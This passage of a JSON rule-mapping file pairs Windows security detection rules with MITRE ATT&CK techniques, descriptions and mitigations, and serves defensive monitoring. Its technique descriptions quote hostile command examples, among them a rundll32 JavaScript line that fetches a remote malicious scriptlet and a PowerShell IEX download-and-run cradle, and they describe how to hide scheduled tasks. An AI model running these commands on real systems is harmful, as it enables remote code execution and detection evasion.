            "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules]( may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel]( Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. For example, [ClickOnce]( can be proxied through Rundll32.exe.\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. \n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading]( techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload. "
        ],
        "mitigation_strategies": [
            "Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass application control."
        ]
    },
    {
        "rule_id": 92101,
        "rule_description": "Powershell process communicating over TCP",
        "mitre_id": [
            "T1095"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol"
        ],
        "description": [
            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
        ]
    },
    {
        "rule_id": 92102,
        "rule_description": "Suspicious DCOM/RPC activity from Powershell process",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 92103,
        "rule_description": "LDAP activity from Powershell process, possible remote system discovery",
        "mitre_id": [
            "T1018"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92104,
        "rule_description": "Suspicious binary created network connection to $(win.eventdata.destinationIp):$(win.eventdata.destinationPort)",
        "mitre_id": [
            "T1095"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol"
        ],
        "description": [
            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
        ]
    },
    {
        "rule_id": 92105,
        "rule_description": "Possible suspicious access to Windows admin shares",
        "mitre_id": [
            "T1021.002"
        ],
        "possible_attacks": [
            "SMB/Windows Admin Shares"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts]( to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job]( [Service Execution]( and [Windows Management Instrumentation]( Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash]( and certain configuration and patch levels."
        ],
        "mitigation_strategies": [
            "Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems."
        ]
    },
    {
        "rule_id": 92106,
        "rule_description": "Windows System process activity over SMB port - Possible suspicious access to Windows admin shares",
        "mitre_id": [
            "T1021.002"
        ],
        "possible_attacks": [
            "SMB/Windows Admin Shares"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts]( to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job]( [Service Execution]( and [Windows Management Instrumentation]( Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash]( and certain configuration and patch levels."
        ],
        "mitigation_strategies": [
            "Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems."
        ]
    },
    {
        "rule_id": 92107,
        "rule_description": "Script generated suspicious network activity over TCP protocol",
        "mitre_id": [
            "T1095"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol"
        ],
        "description": [
            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
        ]
    },
    {
        "rule_id": 92108,
        "rule_description": "Detected RDP port network activity from $(win.eventdata.sourceIp) to $(win.eventdata.destinationIp)",
        "mitre_id": [
            "T1021.001"
        ],
        "possible_attacks": [
            "Remote Desktop Protocol"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features]( or [Terminal Services DLL]( for Persistence."
        ],
        "mitigation_strategies": [
            "Limit remote user permissions if remote access is necessary."
        ]
    },
    {
        "rule_id": 92109,
        "rule_description": "Network activity using RDP port from-to loopback address, possible exploit using reverse tunneling",
        "mitre_id": [
            "T1021.001"
        ],
        "possible_attacks": [
            "Remote Desktop Protocol"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features]( or [Terminal Services DLL]( for Persistence."
        ],
        "mitigation_strategies": [
            "Limit remote user permissions if remote access is necessary."
        ]
    },
    {
        "rule_id": 92110,
        "rule_description": "Detected WinRM activity from $(win.eventdata.sourceIp) to $(win.eventdata.destinationIp)",
        "mitre_id": [
            "T1021.006"
        ],
        "possible_attacks": [
            "Windows Remote Management"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\n\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the `winrm` command or by any number of programs such as PowerShell. WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation]("
        ],
        "mitigation_strategies": [
            "If the service is necessary, lock down critical enclaves with separate WinRM accounts and permissions."
        ]
    },
    {
        "rule_id": 92151,
        "rule_description": "Binary loaded PowerShell automation library - Possible unmanaged Powershell execution by suspicious process",
        "mitre_id": [
            "T1059.001"
        ],
        "possible_attacks": [
            "PowerShell"
        ],
        "description": [
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)."
        ],
        "mitigation_strategies": [
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions."
        ]
    },
    {
        "rule_id": 92152,
        "rule_description": "Printer spooler service loaded a dll file. Possible PrintNightmare exploit: CVE-2021-34527",
        "mitre_id": [
            "T1210"
        ],
        "possible_attacks": [
            "Exploitation of Remote Services"
        ],
        "description": [
            "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery]( or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation]( as a result of lateral movement exploitation as well."
        ],
        "mitigation_strategies": [
            "Regularly scan the internal network for available services to identify new and potentially vulnerable services."
        ]
    },
    {
        "rule_id": 92153,
        "rule_description": "Suspicious process loaded VaultCli.dll module. Possible use to dump stored passwords.",
        "mitre_id": [
            "T1555"
        ],
        "possible_attacks": [
            "Credentials from Password Stores"
        ],
        "description": [
            "Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information."
        ],
        "mitigation_strategies": [
            "Perform regular software updates to mitigate exploitation risk."
        ]
    },
    {
        "rule_id": 92154,
        "rule_description": "Process loaded taskschd.dll module. May be used to create delayed malware execution",
        "mitre_id": [
            "T1053.005"
        ],
        "possible_attacks": [
            "Scheduled Task"
        ],
        "description": [
            "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks]( utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation]( (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution]( adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts]( that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys. "
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems. "
        ]
    },
    {
        "rule_id": 92155,
        "rule_description": "Mshta loaded taskschd.dll module. May be used to create delayed malware execution",
        "mitre_id": [
            "T1053.005"
        ],
        "possible_attacks": [
            "Scheduled Task"
        ],
        "description": [
            "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks]( utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation]( (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution]( adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts]( that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys. "
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems. "
        ]
    },
    {
        "rule_id": 92156,
        "rule_description": "Office application loaded vbeui.dll module. May be used to execute scripting code",
        "mitre_id": [
            "T1059.005"
        ],
        "possible_attacks": [
            "Visual Basic"
        ],
        "description": [
            "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model]( and the [Native API]( through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript]( on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment]( payloads (which may also involve [Mark-of-the-Web Bypass]( to enable execution)."
        ],
        "mitigation_strategies": [
            "Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place."
        ]
    },
    {
        "rule_id": 92157,
        "rule_description": "An executable - $(win.eventdata.image) - loaded $(win.eventdata.imageLoaded) from the Temp directory.",
        "mitre_id": [
            "T1546.011"
        ],
        "possible_attacks": [
            "Application Shimming"
        ],
        "description": [
            "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. \n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control]( (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.  Shims can also be abused to establish persistence by continuously being invoked by affected programs."
        ],
        "mitigation_strategies": [
            "Changing UAC settings to \"Always Notify\" will give the user more visibility when UAC elevation is requested, however, this option will not be popular among users due to the constant UAC interruptions."
        ]
    },
    {
        "rule_id": 92200,
        "rule_description": "Scripting file created under Windows Temp or User folder",
        "mitre_id": [
            "T1059",
            "T1105"
        ],
        "possible_attacks": [
            "Command and Scripting Interpreter",
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell]( while Windows installations include the [Windows Command Shell]( and [PowerShell](\n\nThere are also cross-platform interpreters such as [Python]( as well as those commonly associated with client applications such as [JavaScript]( and [Visual Basic](\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access]( payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services]( in order to achieve remote Execution.",
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place.",
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
    },
    {
        "rule_id": 92201,
        "rule_description": "$(win.eventdata.image) created a new scripting file under Windows Temp or User data folder",
        "mitre_id": [
            "T1105",
            "T1059"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer",
            "Command and Scripting Interpreter"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
            "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell]( while Windows installations include the [Windows Command Shell]( and [PowerShell](\n\nThere are also cross-platform interpreters such as [Python]( as well as those commonly associated with client applications such as [JavaScript]( and [Visual Basic](\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access]( payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services]( in order to achieve remote Execution."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.",
            "Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place."
        ]
    },
    {
        "rule_id": 92202,
        "rule_description": "Executable dropped in Windows root folder by $(win.eventdata.image) process. Possible abuse of Windows admin shares",
        "mitre_id": [
            "T1570"
        ],
        "possible_attacks": [
            "Lateral Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer]( files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\n\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares]( to connected network shares or with authenticated connections via [Remote Desktop Protocol](\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp]( In some cases, adversaries may be able to leverage [Web Service]( such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. "
        ]
    },
    {
        "rule_id": 92203,
        "rule_description": "Executable file created by powershell: $(win.eventdata.targetFilename)",
        "mitre_id": [
            "T1105"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
    },
    {
        "rule_id": 92204,
        "rule_description": "Powershell process created executable file in AppData temp folder",
        "mitre_id": [
            "T1105"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
